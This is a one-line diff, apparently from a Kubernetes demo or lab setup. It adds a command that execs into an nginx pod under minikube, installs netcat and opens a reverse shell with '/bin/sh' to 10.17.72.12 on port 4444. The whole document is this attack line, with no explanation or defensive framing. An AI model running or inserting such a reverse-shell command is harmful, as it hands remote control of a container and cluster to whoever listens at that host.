@@ -1,0 +1,2 @@
+minikube kubectl -- exec demo-nginx-deployment- -- /bin/bash -c "apt-get update && apt-get install -y netcat && nc 10.17.72.12 4444 -c /bin/sh"
+
